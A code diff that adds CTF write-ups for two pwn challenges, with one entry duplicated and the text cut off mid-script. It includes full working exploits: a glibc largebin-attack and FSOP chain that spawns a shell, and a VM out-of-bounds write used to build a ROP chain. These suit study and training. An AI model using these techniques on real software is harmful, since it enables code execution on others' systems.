@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// THEM 2026 — 23 writeups
+// THEM 2026 — 27 writeups
 export const them2026Writeups: WriteUp[] = [
   {
     "id": "them2026-foren-bite",
@@ -846,6 +846,188 @@ export const them2026Writeups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "them2026-pwn-heapshifter",
+    "title": "heapshifter",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THEM 2026",
+    "tags": [],
+    "description": "> The heap remembers what you shift into it. Allocate big, free freely, and\n> remember: nothing you write is stored the way you typed it..",
+    "problemDescription": "> The heap remembers what you shift into it. Allocate big, free freely, and\n> remember: nothing you write is stored the way you typed it..\n\n`nc <host> 36970`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Files",
+        "content": "- `heapshifter`              — chall binary\n- `libc.so.6`               — remote libc\n- `ld-linux-x86-64.so.2`    — remote loader\n- `Dockerfile` / `docker-compose.yml` — host locally lol"
+      },
+      {
+        "title": "run locally",
+        "content": "",
+        "code": "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . heapshifter\n./heapshifter\n\ndocker compose up --build      # listens on :36970"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport select\r\nimport socket\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nimport time\r\n\r\nBIN = \"./heapshifter\"\r\nLD = \"./ld-linux-x86-64.so.2\"\r\n\r\nHOST = \"13.238.150.105\"\r\nPORT = 36970\r\n\r\nKEY = b\"\\x53\\x68\\x1f\\x74\\x21\\x6d\\x65\\x90\"\r\n\r\n# offsets for provided libc\r\nLIBC_LEAK_OFF = 0x21ace0\r\nIO_LIST_ALL = 0x21b680\r\nIO_WFILE_JUMPS = 0x2170c0\r\nSETCONTEXT = 0x539e0\r\nSYSTEM = 0x50d70\r\nBINSH = 0x1d8678\r\nRET = 0x99e\r\n\r\n\r\ndef p64(x):\r\n    return struct.pack(\"<Q\", x & ((1 << 64) - 1))\r\n\r\n\r\ndef u64(b):\r\n    return struct.unpack(\"<Q\", b.ljust(8, b\"\\x00\"))[0]\r\n\r\n\r\ndef enc(data):\r\n    # Program menyimpan input setelah XOR. Supaya memory berisi payload asli,\r\n    # kita kirim payload ^ KEY.\r\n    return bytes([c ^ KEY[i % len(KEY)] for i, c in enumerate(data)])\r\n\r\n\r\nclass IO:\r\n    def __init__(self, remote=False):\r\n        self.remote = remote\r\n        if remote:\r\n            self.s = socket.create_connection((HOST, PORT))\r\n            self.p = None\r\n        else:\r\n            self.p = subprocess.Popen(\r\n                [LD, \"--library-path\", \".\", BIN],\r\n                stdin=subprocess.PIPE,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n            )\r\n            self.s = None\r\n\r\n    def recv(self, timeout=0.05):\r\n        if self.remote:\r\n            self.s.settimeout(timeout)\r\n            try:\r\n                return self.s.recv(4096)\r\n            except Exception:\r\n                return b\"\"\r\n\r\n        data = b\"\"\r\n        r, _, _ = select.select([self.p.stdout, self.p.stderr], [], [], timeout)\r\n        for fd in r:\r\n            data += os.read(fd.fileno(), 4096)\r\n        return data\r\n\r\n    def ru(self, marker, timeout=2):\r\n        data = b\"\"\r\n        end = time.time() + timeout\r\n        while marker not in data and time.time() < end:\r\n            chunk = self.recv(0.02)\r\n            if chunk:\r\n                data += chunk\r\n            elif self.p and self.p.poll() is not None:\r\n                break\r\n        return data\r\n\r\n    def send(self, data):\r\n        if self.remote:\r\n            self.s.sendall(data)\r\n        else:\r\n            self.p.stdin.write(data)\r\n            self.p.stdin.flush()\r\n\r\n    def line(self, x):\r\n        if isinstance(x, int):\r\n            x = str(x).encode()\r\n        elif isinstance(x, str):\r\n            x = x.encode()\r\n        self.send(x + b\"\\n\")\r\n\r\n    def alloc(self, idx, size):\r\n        self.line(1)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        self.ru(b\"size: \")\r\n        self.line(size)\r\n        return self.ru(b\"> \")\r\n\r\n    def free(self, idx):\r\n        self.line(2)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        return self.ru(b\"> \")\r\n\r\n    def edit(self, idx, desired):\r\n        self.line(3)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        self.send(enc(desired))\r\n        return self.ru(b\"> \", 1)\r\n\r\n    def view(self, idx):\r\n        self.line(4)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        data = self.ru(b\"== heapshifter ==\", 1)\r\n        if b\"\\n== heapshifter ==\" in data:\r\n            return data.split(b\"\\n== heapshifter ==\")[0]\r\n        return data\r\n\r\n    def interact(self):\r\n        if self.remote:\r\n            import threading\r\n\r\n            def reader():\r\n                while True:\r\n                    try:\r\n                        data = self.s.recv(4096)\r\n                        if not data:\r\n                            break\r\n                        os.write(1, data)\r\n                    except Exception:\r\n                        break\r\n\r\n            threading.Thread(target=reader, daemon=True).start()\r\n\r\n            while True:\r\n                data = os.read(0, 1024)\r\n                if not data:\r\n                    break\r\n                self.s.sendall(data)\r\n        else:\r\n            while True:\r\n                r, _, _ = select.select([self.p.stdout, self.p.stderr, sys.stdin], [], [])\r\n                for fd in r:\r\n                    if fd is sys.stdin:\r\n                        data = os.read(0, 1024)\r\n                        self.p.stdin.write(data)\r\n                        self.p.stdin.flush()\r\n                    else:\r\n                        os.write(1, os.read(fd.fileno(), 4096))\r\n\r\n\r\ndef fake_file_payload(fp, libc):\r\n    \"\"\"\r\n    Fake _IO_FILE for FSOP:\r\n    _IO_list_all -> fake FILE\r\n    exit() -> _IO_flush_all_lockp()\r\n    fake wide vtable -> setcontext+0x126\r\n    then system(\"/bin/sh\")\r\n    \"\"\"\r\n    size = 0x418\r\n    b = bytearray(b\"\\x00\" * size)\r\n\r\n    def w(off, val):\r\n        if off < 0x10:\r\n            return\r\n        b[off - 0x10:off - 0x08] = p64(val)\r\n\r\n    wide = fp + 0x100\r\n    fake_vtable = fp + 0x300\r\n    rop = fp + 0x380\r\n\r\n    # FILE fields, fp is chunk user pointer / fake FILE base.\r\n    w(0x20, 0)                       # _IO_write_base\r\n    w(0x28, 1)                       # _IO_write_ptr > write_base\r\n    w(0x68, 0)                       # _chain\r\n    w(0x88, fp + 0x280)              # _lock\r\n    w(0xA0, wide)                    # _wide_data\r\n\r\n    # _mode = 0\r\n    b[0xC0 - 0x10:0xC0 - 0x10 + 4] = struct.pack(\"<i\", 0)\r\n\r\n    # vtable = _IO_wfile_jumps\r\n    w(0xD8, libc + IO_WFILE_JUMPS)\r\n\r\n    def ww(off, val):\r\n        w(0x100 + off, val)\r\n\r\n    # wide_data setup\r\n    ww(0x18, 0)\r\n    ww(0x30, 0)\r\n    ww(0x68, libc + BINSH)\r\n    ww(0xA0, rop)\r\n    ww(0xA8, libc + SYSTEM)\r\n    ww(0xE0, fake_vtable)\r\n\r\n    # valid mxcsr for setcontext path\r\n    b[0x100 + 0x1C0 - 0x10:0x100 + 0x1C0 - 0x10 + 4] = struct.pack(\"<I\", 0x1F80)\r\n\r\n    # fake wide vtable: call setcontext+0x126\r\n    w(0x300 + 0x68, libc + SETCONTEXT + 0x126)\r\n\r\n    # ROP-ish stack for setcontext pivot\r\n    w(0x380, libc + BINSH)\r\n    w(0x388, libc + RET)\r\n    w(0x390, libc + SYSTEM)\r\n\r\n    return bytes(b)\r\n\r\n\r\ndef exploit(remote=False):\r\n    io = IO(remote)\r\n    io.ru(b\"> \")\r\n\r\n    # Large chunks. Size range from challenge README/binary behavior: 0x410..0x4d0.\r\n    A_SZ = 0x428\r\n    B_SZ = 0x418\r\n\r\n    # Layout:\r\n    # A, guard, B, guard\r\n    io.alloc(0, A_SZ)\r\n    io.alloc(1, 0x410)\r\n    io.alloc(2, B_SZ)\r\n    io.alloc(3, 0x410)\r\n\r\n    # Free A and B. UAF view gives unsorted-bin pointers and heap pointers.\r\n    io.free(0)\r\n    io.free(2)\r\n\r\n    d_a = io.view(0)\r\n    d_b = io.view(2)\r\n\r\n    libc_leak = u64(d_a[:8])\r\n    b_ptr = u64(d_a[8:16])\r\n    a_ptr = u64(d_b[:8])\r\n\r\n    libc = libc_leak - LIBC_LEAK_OFF\r\n\r\n    print(\"[+] libc leak =\", hex(libc_leak), flush=True)\r\n    print(\"[+] libc base =\", hex(libc), flush=True)\r\n    print(\"[+] A chunk   =\", hex(a_ptr), flush=True)\r\n    print(\"[+] B chunk   =\", hex(b_ptr), flush=True)\r\n\r\n    # Allocate B back, so only A remains to be sorted into largebin.\r\n    io.alloc(4, B_SZ)\r\n\r\n    # Force A into largebin.\r\n    io.alloc(5, 0x4D0)\r\n\r\n    # Largebin attack:\r\n    # corrupt A->bk_nextsize = _IO_list_all - 0x20\r\n    cur = bytearray(io.view(0)[:A_SZ].ljust(A_SZ, b\"\\x00\"))\r\n    target = libc + IO_LIST_ALL\r\n    cur[0x18:0x20] = p64(target - 0x20)\r\n    io.edit(0, bytes(cur))\r\n\r\n    print(\"[+] overwrite largebin bk_nextsize ->\", hex(target - 0x20), flush=True)\r\n\r\n    # Free B into unsorted.\r\n    io.free(4)\r\n\r\n    # Trigger largebin insertion of B.\r\n    # This writes B pointer into _IO_list_all.\r\n    io.alloc(6, 0x4D0)\r\n\r\n    print(\"[+] _IO_list_all should point to B\", flush=True)\r\n\r\n    # Write fake FILE structure into B via stale slot 2.\r\n    payload = fake_file_payload(b_ptr, libc)\r\n    io.edit(2, payload)\r\n\r\n    print(\"[+] fake FILE written\", flush=True)\r\n    print(\"[+] triggering exit -> FSOP\", flush=True)\r\n\r\n    # Exit menu triggers libc cleanup / FSOP.\r\n    io.line(5)\r\n\r\n    time.sleep(0.5)\r\n\r\n    # If shell works, ask flag.\r\n    io.send(b\"cat flag.txt\\n\")\r\n    time.sleep(0.5)\r\n\r\n    out = b\"\"\r\n    for _ in range(30):\r\n        out += io.recv(0.1)\r\n\r\n    print(out.decode(errors=\"ignore\"))\r\n\r\n    if b\"THEM\" not in out:\r\n        io.interact()\r\n\r\n\r\ndef main():\r\n    remote = len(sys.argv) > 1 and sys.argv[1].upper() == \"REMOTE\"\r\n    exploit(remote)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "them2026-pwn-phantom",
+    "title": "Phantom",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THEM 2026",
+    "tags": [],
+    "description": "Writeup for challenge Phantom",
+    "problemDescription": "Challenge ini adalah custom bytecode VM. Bug utamanya ada di instruksi `PEEK` dan `POKE`: nilai register dipakai sebagai index ke stack VM tanpa bounds check. Karena seluruh state VM disimpan di stack frame fungsi interpreter, index yang cukup besar bisa keluar dari area stack VM dan menimpa saved return address.\n\nSetelah return address milik interpreter bisa ditulis, exploit-nya tinggal:\n\n1. Tulis ROP chain tahap pertama ke saved RIP interpreter.\n2. Chain pertama memanggil `read(0, .bss, len(stage2))`.\n3. Setelah `read`, pivot `rsp` ke `.bss`.\n4. ROP tahap kedua menjalankan syscall `open(\"/home/flag.txt\", 0)`, `read(3, buf, 0x100)`, lalu `write(1, buf, 0x100)`.\n\nFlag yang keluar:\n\n`THEM?!CTF{ph4nt0m_byt3c0d3_vm_3sc4p3_m4st3r}`",
+    "tools": [],
+    "analysis": "Dari disassembly fungsi interpreter di `0x4019ee`, terlihat layout penting di stack:\n\n- buffer bytecode ada di sekitar `rbp-0xb00`\n- register VM ada di sekitar `rbp-0x2f0`\n- stack VM ada di sekitar `rbp-0x270`\n\nAda dispatcher opcode `0x00` sampai `0x17`. Beberapa opcode penting yang dipakai waktu eksploitasi:\n\n- `0x02` = `PUSH imm64`\n- `0x03` = `POP reg`\n- `0x15` = `POKE reg`\n- `0x17` = `INC reg`\n\nInstruksi `POKE` kira-kira bekerja seperti ini:\n\n```c\nidx = regs[reg];\nvalue = vm_stack[sp - 1];\nvm_stack[idx] = value;\n```\n\nMasalahnya, `idx` tidak pernah dicek.\n\nAddressing yang dipakai `POKE` adalah:\n\n```c\n[rbp + (idx + 0x112) * 8 - 0xb00]\n```\n\nKalau dihitung:\n\n- `idx = 0` mengarah ke awal stack VM\n- `idx = 79` mengarah ke `rbp + 8`, yaitu saved RIP interpreter\n\nItu artinya kita punya primitive write 8-byte ke return address hanya dengan:\n\n1. isi sebuah register dengan `79`\n2. `PUSH` nilai target\n3. `POKE` ke register tadi\n\nSaya validasi dulu dengan payload kecil yang menulis `0x4141414141414141` ke index `79`, dan proses langsung crash saat interpreter return. Berarti kontrol RIP benar-benar kena.",
+    "solution": [
+      {
+        "title": "Recon",
+        "content": "Binary:\n\n- ELF 64-bit\n- static\n- stripped\n- NX enabled\n- No PIE\n- No canary\n\nKarena static dan non-PIE, alamat gadget ROP tetap. Ini sangat membantu begitu kita dapat arbitrary write ke return address.\n\nPrompt program:\n\n\n\nJadi input pertama adalah satu baris hex, lalu bytecode hasil decode dieksekusi oleh VM.",
+        "code": "Submit your phantom script as hex-encoded bytecode.\nMax code size: 2048 bytes (4096 hex chars)"
+      },
+      {
+        "title": "Tahap 1: tulis ROP awal ke stack return interpreter",
+        "content": "Karena kita belum punya tempat yang nyaman untuk chain panjang, saya tulis ROP kecil langsung ke area return interpreter:\n\n\n\nGadget yang dipakai:\n\n- `pop rdi ; ret`\n- `pop rsi ; ret`\n- `pop rdx ; pop rbx ; ret`\n- `pop rax ; ret`\n- `syscall ; ret`\n- `pop rsp ; ret`\n\nKeuntungannya:\n\n- stage pertama pendek\n- tidak perlu tahu alamat stack runtime\n- stage kedua bisa dikirim raw binary setelah hex bytecode selesai dibaca",
+        "code": "read(0, .bss, len(stage2));\npivot rsp = .bss;"
+      },
+      {
+        "title": "Tahap 2: ROP penuh di `.bss`",
+        "content": "Setelah `read`, stack dipindah ke `.bss`, lalu chain kedua jalan:\n\n1. `open(\"/home/flag.txt\", 0)`\n2. `read(3, FLAG_BUF, 0x100)`\n3. `write(1, FLAG_BUF, 0x100)`\n4. `exit(0)`\n\nSaya sengaja pakai fd `3` setelah `open`, karena untuk service model begini stdin/stdout/stderr biasanya `0/1/2`, jadi file pertama yang dibuka program akan jadi `3`. Di remote ini valid."
+      },
+      {
+        "title": "Kenapa Bisa Kirim Stage 2 Setelah Hex?",
+        "content": "Program hanya membaca satu line hex untuk parser VM. Setelah itu file descriptor `stdin` tetap hidup. Begitu interpreter selesai dan control flow pindah ke ROP tahap pertama, chain tadi memanggil `read(0, .bss, len(stage2))`.\n\nJadi format kirimnya:\n\n1. `sendline(hex(stage1_vm_bytecode))`\n2. `send(stage2_raw_rop)`\n\nTidak perlu koneksi kedua."
+      },
+      {
+        "title": "Exploit Script",
+        "content": "Script final ada di:\n\n- `exploit.py`\n\nJalankan:\n\n\n\nMode lokal juga ada:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
+      },
+      {
+        "title": "Potongan Bug yang Paling Penting",
+        "content": "Secara konsep, ini bagian yang fatal:\n\n\n\nTanpa validasi bahwa `target` masih berada dalam batas stack VM.\n\nBegitu nilai register bisa diisi bebas dengan `PUSH imm64` lalu `POP reg`, custom VM ini pada dasarnya memberi arbitrary indexed write ke stack frame interpreter.",
+        "code": "target = regs[user_reg];\nvm_stack[target] = popped_value;"
+      },
+      {
+        "title": "Catatan Akhir",
+        "content": "Hal yang bikin challenge ini cepat runtuh:\n\n- state VM diletakkan di stack\n- register bisa berisi angka 64-bit bebas\n- `PEEK/POKE` tidak membatasi index\n- binary non-PIE, jadi ROP address tetap\n\nBegitu satu saja dari poin itu diperbaiki, exploit-nya jauh lebih ribet. Yang paling tepat tentu menambahkan bounds check di `PEEK` dan `POKE`, dan idealnya memisahkan state VM ke heap atau struct yang tidak berdampingan dengan control data fungsi."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "from pwn import *\r\n\r\n\r\nHOST = \"45.130.164.173\"\r\nPORT = 30207\r\n\r\nPOP_RDI = 0x4032B8\r\nPOP_RSI = 0x40B9A8\r\nPOP_RDX_RBX = 0x463777\r\nPOP_RAX = 0x40FCBF\r\nPOP_RSP = 0x405981\r\nSYSCALL_RET = 0x412BB2\r\n\r\nBSS = 0x4A9000\r\nREAD_BUF = BSS\r\nFLAG_BUF = BSS + 0x300\r\n\r\nVM_HALT = 0x00\r\nVM_PUSH = 0x02\r\nVM_POP = 0x03\r\nVM_POKE = 0x15\r\nVM_INC = 0x17\r\n\r\n\r\ndef vm_push_imm(x):\r\n    return p8(VM_PUSH) + p64(x & 0xFFFFFFFFFFFFFFFF)\r\n\r\n\r\ndef vm_pop_reg(r):\r\n    return p8(VM_POP) + p8(r)\r\n\r\n\r\ndef vm_poke(r):\r\n    return p8(VM_POKE) + p8(r)\r\n\r\n\r\ndef vm_inc(r):\r\n    return p8(VM_INC) + p8(r)\r\n\r\n\r\ndef build_stage2():\r\n    chain = flat(\r\n        POP_RDI,\r\n        READ_BUF + 0x200,\r\n        POP_RSI,\r\n        0,\r\n        POP_RDX_RBX,\r\n        0,\r\n        0,\r\n        POP_RAX,\r\n        2,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        3,\r\n        POP_RSI,\r\n        FLAG_BUF,\r\n        POP_RDX_RBX,\r\n        0x100,\r\n        0,\r\n        POP_RAX,\r\n        0,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        1,\r\n        POP_RSI,\r\n        FLAG_BUF,\r\n        POP_RDX_RBX,\r\n        0x100,\r\n        0,\r\n        POP_RAX,\r\n        1,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        0,\r\n        POP_RAX,\r\n        60,\r\n        SYSCALL_RET,\r\n    )\r\n    chain = chain.ljust(0x200, b\"\\x00\")\r\n    return chain + b\"/home/flag.txt\\x00\"\r\n\r\n\r\ndef build_stage1(stage2_len):\r\n    first_chain = [\r\n        POP_RDI,\r\n        0,\r\n        POP_RSI,\r\n        READ_BUF,\r\n        POP_RDX_RBX,\r\n        stage2_len,\r\n        0,\r\n        POP_RAX,\r\n        0,\r\n        SYSCALL_RET,\r\n        POP_RSP,\r\n        READ_BUF,\r\n    ]\r\n\r\n    code = bytearray()\r\n    code += vm_push_imm(79)\r\n    code += vm_pop_reg(0)\r\n    for q in first_chain:\r\n        code += vm_push_imm(q)\r\n        code += vm_poke(0)\r\n        code += vm_inc(0)\r\n    code += p8(VM_HALT)\r\n    return bytes(code)\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        return process([\"./challenge/phantom\"])\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef main():\r\n    context.arch = \"amd64\"\r\n    io = start()\r\n\r\n    stage2 = build_stage2()\r\n    stage1 = build_stage1(len(stage2))\r\n\r\n    io.recvuntil(b\"phantom> \")\r\n    io.sendline(stage1.hex().encode())\r\n    io.send(stage2)\r\n\r\n    data = io.recvall(timeout=5)\r\n    print(data.decode(\"latin-1\", errors=\"replace\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CTF{ph4nt0m_byt3c0d3_vm_3sc4p3_m4st3r}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "them2026-pwn-heapshifter-distribution",
+    "title": "heapshifter",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THEM 2026",
+    "tags": [],
+    "description": "> The heap remembers what you shift into it. Allocate big, free freely, and\n> remember: nothing you write is stored the way you typed it..",
+    "problemDescription": "> The heap remembers what you shift into it. Allocate big, free freely, and\n> remember: nothing you write is stored the way you typed it..\n\n`nc <host> 36970`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Files",
+        "content": "- `heapshifter`              — chall binary\n- `libc.so.6`               — remote libc\n- `ld-linux-x86-64.so.2`    — remote loader\n- `Dockerfile` / `docker-compose.yml` — host locally lol"
+      },
+      {
+        "title": "run locally",
+        "content": "",
+        "code": "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . heapshifter\n./heapshifter\n\ndocker compose up --build      # listens on :36970"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport select\r\nimport socket\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nimport time\r\n\r\nBIN = \"./heapshifter\"\r\nLD = \"./ld-linux-x86-64.so.2\"\r\n\r\nHOST = \"13.238.150.105\"\r\nPORT = 36970\r\n\r\nKEY = b\"\\x53\\x68\\x1f\\x74\\x21\\x6d\\x65\\x90\"\r\n\r\n# offsets for provided libc\r\nLIBC_LEAK_OFF = 0x21ace0\r\nIO_LIST_ALL = 0x21b680\r\nIO_WFILE_JUMPS = 0x2170c0\r\nSETCONTEXT = 0x539e0\r\nSYSTEM = 0x50d70\r\nBINSH = 0x1d8678\r\nRET = 0x99e\r\n\r\n\r\ndef p64(x):\r\n    return struct.pack(\"<Q\", x & ((1 << 64) - 1))\r\n\r\n\r\ndef u64(b):\r\n    return struct.unpack(\"<Q\", b.ljust(8, b\"\\x00\"))[0]\r\n\r\n\r\ndef enc(data):\r\n    # Program menyimpan input setelah XOR. Supaya memory berisi payload asli,\r\n    # kita kirim payload ^ KEY.\r\n    return bytes([c ^ KEY[i % len(KEY)] for i, c in enumerate(data)])\r\n\r\n\r\nclass IO:\r\n    def __init__(self, remote=False):\r\n        self.remote = remote\r\n        if remote:\r\n            self.s = socket.create_connection((HOST, PORT))\r\n            self.p = None\r\n        else:\r\n            self.p = subprocess.Popen(\r\n                [LD, \"--library-path\", \".\", BIN],\r\n                stdin=subprocess.PIPE,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n            )\r\n            self.s = None\r\n\r\n    def recv(self, timeout=0.05):\r\n        if self.remote:\r\n            self.s.settimeout(timeout)\r\n            try:\r\n                return self.s.recv(4096)\r\n            except Exception:\r\n                return b\"\"\r\n\r\n        data = b\"\"\r\n        r, _, _ = select.select([self.p.stdout, self.p.stderr], [], [], timeout)\r\n        for fd in r:\r\n            data += os.read(fd.fileno(), 4096)\r\n        return data\r\n\r\n    def ru(self, marker, timeout=2):\r\n        data = b\"\"\r\n        end = time.time() + timeout\r\n        while marker not in data and time.time() < end:\r\n            chunk = self.recv(0.02)\r\n            if chunk:\r\n                data += chunk\r\n            elif self.p and self.p.poll() is not None:\r\n                break\r\n        return data\r\n\r\n    def send(self, data):\r\n        if self.remote:\r\n            self.s.sendall(data)\r\n        else:\r\n            self.p.stdin.write(data)\r\n            self.p.stdin.flush()\r\n\r\n    def line(self, x):\r\n        if isinstance(x, int):\r\n            x = str(x).encode()\r\n        elif isinstance(x, str):\r\n            x = x.encode()\r\n        self.send(x + b\"\\n\")\r\n\r\n    def alloc(self, idx, size):\r\n        self.line(1)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        self.ru(b\"size: \")\r\n        self.line(size)\r\n        return self.ru(b\"> \")\r\n\r\n    def free(self, idx):\r\n        self.line(2)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        return self.ru(b\"> \")\r\n\r\n    def edit(self, idx, desired):\r\n        self.line(3)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        self.send(enc(desired))\r\n        return self.ru(b\"> \", 1)\r\n\r\n    def view(self, idx):\r\n        self.line(4)\r\n        self.ru(b\"slot: \")\r\n        self.line(idx)\r\n        data = self.ru(b\"== heapshifter ==\", 1)\r\n        if b\"\\n== heapshifter ==\" in data:\r\n            return data.split(b\"\\n== heapshifter ==\")[0]\r\n        return data\r\n\r\n    def interact(self):\r\n        if self.remote:\r\n            import threading\r\n\r\n            def reader():\r\n                while True:\r\n                    try:\r\n                        data = self.s.recv(4096)\r\n                        if not data:\r\n                            break\r\n                        os.write(1, data)\r\n                    except Exception:\r\n                        break\r\n\r\n            threading.Thread(target=reader, daemon=True).start()\r\n\r\n            while True:\r\n                data = os.read(0, 1024)\r\n                if not data:\r\n                    break\r\n                self.s.sendall(data)\r\n        else:\r\n            while True:\r\n                r, _, _ = select.select([self.p.stdout, self.p.stderr, sys.stdin], [], [])\r\n                for fd in r:\r\n                    if fd is sys.stdin:\r\n                        data = os.read(0, 1024)\r\n                        self.p.stdin.write(data)\r\n                        self.p.stdin.flush()\r\n                    else:\r\n                        os.write(1, os.read(fd.fileno(), 4096))\r\n\r\n\r\ndef fake_file_payload(fp, libc):\r\n    \"\"\"\r\n    Fake _IO_FILE for FSOP:\r\n    _IO_list_all -> fake FILE\r\n    exit() -> _IO_flush_all_lockp()\r\n    fake wide vtable -> setcontext+0x126\r\n    then system(\"/bin/sh\")\r\n    \"\"\"\r\n    size = 0x418\r\n    b = bytearray(b\"\\x00\" * size)\r\n\r\n    def w(off, val):\r\n        if off < 0x10:\r\n            return\r\n        b[off - 0x10:off - 0x08] = p64(val)\r\n\r\n    wide = fp + 0x100\r\n    fake_vtable = fp + 0x300\r\n    rop = fp + 0x380\r\n\r\n    # FILE fields, fp is chunk user pointer / fake FILE base.\r\n    w(0x20, 0)                       # _IO_write_base\r\n    w(0x28, 1)                       # _IO_write_ptr > write_base\r\n    w(0x68, 0)                       # _chain\r\n    w(0x88, fp + 0x280)              # _lock\r\n    w(0xA0, wide)                    # _wide_data\r\n\r\n    # _mode = 0\r\n    b[0xC0 - 0x10:0xC0 - 0x10 + 4] = struct.pack(\"<i\", 0)\r\n\r\n    # vtable = _IO_wfile_jumps\r\n    w(0xD8, libc + IO_WFILE_JUMPS)\r\n\r\n    def ww(off, val):\r\n        w(0x100 + off, val)\r\n\r\n    # wide_data setup\r\n    ww(0x18, 0)\r\n    ww(0x30, 0)\r\n    ww(0x68, libc + BINSH)\r\n    ww(0xA0, rop)\r\n    ww(0xA8, libc + SYSTEM)\r\n    ww(0xE0, fake_vtable)\r\n\r\n    # valid mxcsr for setcontext path\r\n    b[0x100 + 0x1C0 - 0x10:0x100 + 0x1C0 - 0x10 + 4] = struct.pack(\"<I\", 0x1F80)\r\n\r\n    # fake wide vtable: call setcontext+0x126\r\n    w(0x300 + 0x68, libc + SETCONTEXT + 0x126)\r\n\r\n    # ROP-ish stack for setcontext pivot\r\n    w(0x380, libc + BINSH)\r\n    w(0x388, libc + RET)\r\n    w(0x390, libc + SYSTEM)\r\n\r\n    return bytes(b)\r\n\r\n\r\ndef exploit(remote=False):\r\n    io = IO(remote)\r\n    io.ru(b\"> \")\r\n\r\n    # Large chunks. Size range from challenge README/binary behavior: 0x410..0x4d0.\r\n    A_SZ = 0x428\r\n    B_SZ = 0x418\r\n\r\n    # Layout:\r\n    # A, guard, B, guard\r\n    io.alloc(0, A_SZ)\r\n    io.alloc(1, 0x410)\r\n    io.alloc(2, B_SZ)\r\n    io.alloc(3, 0x410)\r\n\r\n    # Free A and B. UAF view gives unsorted-bin pointers and heap pointers.\r\n    io.free(0)\r\n    io.free(2)\r\n\r\n    d_a = io.view(0)\r\n    d_b = io.view(2)\r\n\r\n    libc_leak = u64(d_a[:8])\r\n    b_ptr = u64(d_a[8:16])\r\n    a_ptr = u64(d_b[:8])\r\n\r\n    libc = libc_leak - LIBC_LEAK_OFF\r\n\r\n    print(\"[+] libc leak =\", hex(libc_leak), flush=True)\r\n    print(\"[+] libc base =\", hex(libc), flush=True)\r\n    print(\"[+] A chunk   =\", hex(a_ptr), flush=True)\r\n    print(\"[+] B chunk   =\", hex(b_ptr), flush=True)\r\n\r\n    # Allocate B back, so only A remains to be sorted into largebin.\r\n    io.alloc(4, B_SZ)\r\n\r\n    # Force A into largebin.\r\n    io.alloc(5, 0x4D0)\r\n\r\n    # Largebin attack:\r\n    # corrupt A->bk_nextsize = _IO_list_all - 0x20\r\n    cur = bytearray(io.view(0)[:A_SZ].ljust(A_SZ, b\"\\x00\"))\r\n    target = libc + IO_LIST_ALL\r\n    cur[0x18:0x20] = p64(target - 0x20)\r\n    io.edit(0, bytes(cur))\r\n\r\n    print(\"[+] overwrite largebin bk_nextsize ->\", hex(target - 0x20), flush=True)\r\n\r\n    # Free B into unsorted.\r\n    io.free(4)\r\n\r\n    # Trigger largebin insertion of B.\r\n    # This writes B pointer into _IO_list_all.\r\n    io.alloc(6, 0x4D0)\r\n\r\n    print(\"[+] _IO_list_all should point to B\", flush=True)\r\n\r\n    # Write fake FILE structure into B via stale slot 2.\r\n    payload = fake_file_payload(b_ptr, libc)\r\n    io.edit(2, payload)\r\n\r\n    print(\"[+] fake FILE written\", flush=True)\r\n    print(\"[+] triggering exit -> FSOP\", flush=True)\r\n\r\n    # Exit menu triggers libc cleanup / FSOP.\r\n    io.line(5)\r\n\r\n    time.sleep(0.5)\r\n\r\n    # If shell works, ask flag.\r\n    io.send(b\"cat flag.txt\\n\")\r\n    time.sleep(0.5)\r\n\r\n    out = b\"\"\r\n    for _ in range(30):\r\n        out += io.recv(0.1)\r\n\r\n    print(out.decode(errors=\"ignore\"))\r\n\r\n    if b\"THEM\" not in out:\r\n        io.interact()\r\n\r\n\r\ndef main():\r\n    remote = len(sys.argv) > 1 and sys.argv[1].upper() == \"REMOTE\"\r\n    exploit(remote)\r\n\r\n\r\nif __name__ == 